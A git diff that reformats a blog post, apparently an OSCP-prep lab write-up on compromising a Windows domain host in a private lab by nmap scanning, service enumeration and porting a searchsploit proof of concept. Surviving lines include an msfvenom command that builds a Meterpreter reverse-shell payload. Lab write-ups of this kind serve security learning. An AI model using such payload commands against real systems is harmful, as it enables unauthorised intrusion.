@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
 title: Internal
-tags: []
+tags: ["metasploit"]
 ---
 
 **Start 18:09 07-01-2025**
@@ -11,9 +11,9 @@ tags: []
 Scope:
 192.168.213.40
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV -oN nmap 192.168.213.40 -T5 -vvvv --min-rate=5000 -sT -p-
@@ -102,11 +102,11 @@ We got a CVE, but for now let's enumerate further.
 
 Judging by the presence of port `53` we see that our target is the **Domain** of a network.
 
->[!note]
->From our [[Active Directory Testing]] note we remember to start with SMB, so let's do that.
+:::note
+From our **Active Directory Testing** note we remember to start with SMB, so let's do that.
+:::
 
-
-## 445/TCP - SMB
+### 445/TCP - SMB
 
 ![](../../../assets/f819da67ca0d3cf14d3159a36ab89915.png)
 
@@ -114,15 +114,16 @@ Judging by the presence of port `53` we see that our target is the **Domain** of
 
 With smbclient we can connect, but nothing is shared with the anonymous user.
 
->[!caution]
->I found an exploit but wasn't 100% sure whether this was the one I'd need, so I enumerated further first.
->
+:::caution
+I found an exploit but wasn't 100% sure whether this was the one I'd need, so I enumerated further first.
+:::
+
 ![](../../../assets/2facc1e81704b3f95fd7a8d1eacafd18.png)
 
 I then went ahead and checked `135/139` RPC.
 
 
-## 135/TCP - RPC
+### 135/TCP - RPC
 
 ![](../../../assets/b2b840855fe2bafc903dc6bd06c8f77d.png)
 
@@ -131,10 +132,11 @@ We didn't have the right clearance eventhough we could log in.
 Next step would be to test port `3389`.
 
 
-## 3389/TCP - RDP
+### 3389/TCP - RDP
 
->[!note]
->I checked the [following guide](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html) for enumerating this port.
+:::note
+I checked the [following guide](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html) for enumerating this port.
+:::
 
 ![](../../../assets/dc1174983d471bea99605f2a6a1e231d.png)
 
@@ -147,13 +149,13 @@ However we don't have a password.
 Let's enumerate further.
 
 
-## 5357/TCP - WSDAPI
+### 5357/TCP - WSDAPI
 
 ![](../../../assets/a4279776f61df9ae8e18d304ef87e7ac.png)
 
 ![](../../../assets/bd957ece54b125434eed3f29e45e0332.png)
 
->[!quote]
+<br></br>
 >Port should be correctly mapped by the Windows Firewall to only accept connections from local network.
 
 Interesting...
@@ -173,7 +175,7 @@ When looking for an exploit for this vulnerability we stumble across the exact s
 Let's grab the PoC from searchsploit.
 
 
-# Initial Foothold
+## Initial Foothold
 
 The whole PoC is written in Python2 which we will have to adjust, as well as some other issues.
 
@@ -189,8 +191,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443  EXITFUNC=threa
 
 ![](../../../assets/a725c1766d2572f8d049d462ff188ecc.png)
 
->[!note]
->Also note the difference of the added lower case ‘b’ before the open double quotation. This indicated a byte string in python3.
+:::note
+Also note the difference of the added lower case ‘b’ before the open double quotation. This indicated a byte string in python3.
+:::
 
 ![](../../../assets/0e8b23bc74c932460c5b8b3d706b31de.png)
 
@@ -331,9 +334,9 @@ Let's set up a listener and execute.
 
 More troubleshooting.
 
->[!info]
->Easily solved using `pip3 install pysmb`
->
+:::tip
+Easily solved using `pip3 install pysmb`
+:::
 
 Unfortunately enough something must've gone wrong since I did *NOT* receive a connection back:
 
@@ -360,8 +363,9 @@ Well shit, box reverting time.
 
 After trying many different ports the shell still would not fire. Anyways I did everything correct apparently but just didn't struck lucky, sucks.
 
->[!note]
->I tried this on my laptop a day afterwards and here the metasploit exploit *did* fire.
+:::note
+I tried this on my laptop a day afterwards and here the metasploit exploit *did* fire.
+:::
 
 ![](../../../assets/f6f09bf19c840773c09e777311397c8d.png)
 
@@ -375,5 +379,3 @@ After trying many different ports the shell still would not fire. Anyways I did 
 **Finished 08-01-2025**
 
 [^Links]: [[OSCP Prep]]
-
-#metasploit 
